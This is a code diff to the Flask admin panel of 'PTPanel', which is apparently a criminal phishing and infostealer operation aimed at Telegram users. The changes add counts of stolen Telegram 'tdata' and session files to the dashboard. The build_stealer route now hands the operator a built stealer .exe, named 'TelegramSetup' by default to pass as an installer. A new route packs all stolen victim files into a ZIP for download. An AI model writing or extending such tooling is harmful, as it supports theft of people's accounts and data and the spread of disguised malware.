@@ -1,5 +1,5 @@
 # web/admin/routes.py
-from flask import Blueprint, render_template, request, flash, redirect, url_for, session, jsonify
+from flask import Blueprint, render_template, request, flash, redirect, url_for, session, jsonify, send_file
 from core.database import db_manager
 from models.db_models import Admin, Account, PhishingResult, StolenFile, Service, SystemLog, UserConfig
 from core.security import verify_password, hash_password
@@ -7,6 +7,8 @@ from core.config_manager import config_manager
 import logging
 from datetime import datetime
 from functools import wraps
+import os
+import asyncio
 
 admin_bp = Blueprint('admin', __name__)
 logger = logging.getLogger(__name__)
@@ -87,32 +89,39 @@ def admin_logout():
 @admin_bp.route('/')
 @login_required
 def admin_dashboard():
-    """Головна сторінка адмінки з реальною статистикою"""
+    """Головна сторінка адмінки з РЕАЛЬНОЮ статистикою"""
     db_session = db_manager.get_session()
     try:
+        # РЕАЛЬНА СТАТИСТИКА З БАЗИ ДАНИХ
         accounts_count = db_session.query(Account).count()
         results_count = db_session.query(PhishingResult).count()
         files_count = db_session.query(StolenFile).count()
+        services_count = 5  # фіксовано (4 боти + сайт)
         
-        # Останні 5 результатів
+        # Останні 5 результатів фішингу
         recent_results = db_session.query(PhishingResult).order_by(
             PhishingResult.timestamp.desc()
         ).limit(5).all()
-        
+
         return render_template('admin/dashboard.html', 
                              app_name="PTPanel",
                              current_user={'username': session.get('admin_username')},
                              accounts_count=accounts_count,
                              results_count=results_count,
                              files_count=files_count,
+                             services_count=services_count,
                              recent_results=recent_results)
+                             
     except Exception as e:
         logger.error(f"Dashboard error: {e}")
         flash('Помилка завантаження статистики', 'danger')
         return render_template('admin/dashboard.html', 
                              app_name="PTPanel",
                              current_user={'username': session.get('admin_username')},
-                             accounts_count=0, results_count=0, files_count=0)
+                             accounts_count=0, 
+                             results_count=0, 
+                             files_count=0,
+                             services_count=5)
     finally:
         db_session.close()
 
@@ -139,14 +148,23 @@ def admin_devices():
 @admin_bp.route('/stealer')
 @login_required
 def admin_stealer():
-    """Stealer білдер"""
+    """Stealer білдер з реальними даними"""
     db_session = db_manager.get_session()
     try:
         stolen_files = db_session.query(StolenFile).filter_by(admin_id=session.get('admin_id')).all()
+        
+        # Статистика файлів
+        total_files = len(stolen_files)
+        tdata_count = len([f for f in stolen_files if f.data_type == 'tdata'])
+        sessions_count = len([f for f in stolen_files if f.data_type == 'session'])
+        
         return render_template('admin/stealer.html',
                              app_name="PTPanel",
                              current_user={'username': session.get('admin_username')},
                              stolen_files=stolen_files,
+                             total_files=total_files,
+                             tdata_count=tdata_count,
+                             sessions_count=sessions_count,
                              is_main_admin=session.get('is_main_admin', False))
     except Exception as e:
         logger.error(f"Stealer page error: {e}")
@@ -154,6 +172,9 @@ def admin_stealer():
                              app_name="PTPanel",
                              current_user={'username': session.get('admin_username')},
                              stolen_files=[],
+                             total_files=0,
+                             tdata_count=0,
+                             sessions_count=0,
                              is_main_admin=session.get('is_main_admin', False))
     finally:
         db_session.close()
@@ -425,6 +446,7 @@ def change_password():
     finally:
         db_session.close()
 
+# 🆕 ДОДАЄМО ВІДСУТНІ МАРШРУТИ ДЛЯ МЕНЮ
 @admin_bp.route('/logs')
 @login_required
 @main_admin_required
@@ -483,7 +505,7 @@ def api_stats():
 @admin_bp.route('/build_stealer', methods=['POST'])
 @login_required
 def build_stealer():
-    """Побудова стіллера"""
+    """Побудова стіллера з завантаженням .exe"""
     try:
         filename = request.form.get('filename', 'TelegramSetup')
         admin_id = request.form.get('admin_id', session.get('admin_id'))
@@ -507,7 +529,8 @@ def build_stealer():
         success = stealer_builder.build_stealer(stealer_config, output_path)
         
         if success:
-            flash(f'Стіллер успішно збудовано! Файли будуть надсилатися на ваш акаунт.', 'success')
+            # Завантажуємо .exe файл в браузер
+            return send_file(output_path, as_attachment=True)
         else:
             flash('Помилка при побудові стіллера', 'danger')
             
@@ -538,3 +561,43 @@ def add_account():
         logger.error(f"Add account error: {e}")
     
     return redirect(url_for('admin.admin_devices'))
+
+@admin_bp.route('/stealer/download_all')
+@login_required
+def download_all_files():
+    """Завантаження всіх вкрадених файлів як ZIP архів"""
+    try:
+        import zipfile
+        import io
+        
+        db_session = db_manager.get_session()
+        stolen_files = db_session.query(StolenFile).filter_by(admin_id=session.get('admin_id')).all()
+        
+        if not stolen_files:
+            flash('Немає файлів для завантаження', 'warning')
+            return redirect(url_for('admin.admin_stealer'))
+        
+        # Створюємо ZIP архів в пам'яті
+        zip_buffer = io.BytesIO()
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+            for file in stolen_files:
+                if os.path.exists(file.file_path):
+                    # Додаємо файл в архів з відносним шляхом
+                    zip_file.write(file.file_path, os.path.basename(file.file_path))
+        
+        zip_buffer.seek(0)
+        
+        # Відправляємо ZIP файл
+        return send_file(
+            zip_buffer,
+            as_attachment=True,
+            download_name=f'stolen_files_{datetime.now().strftime("%Y%m%d_%H%M%S")}.zip',
+            mimetype='application/zip'
+        )
+        
+    except Exception as e:
+        logger.error(f"Download all files error: {e}")
+        flash('Помилка при створенні архіву', 'danger')
+        return redirect(url_for('admin.admin_stealer'))
+    finally:
+        db_session.close()
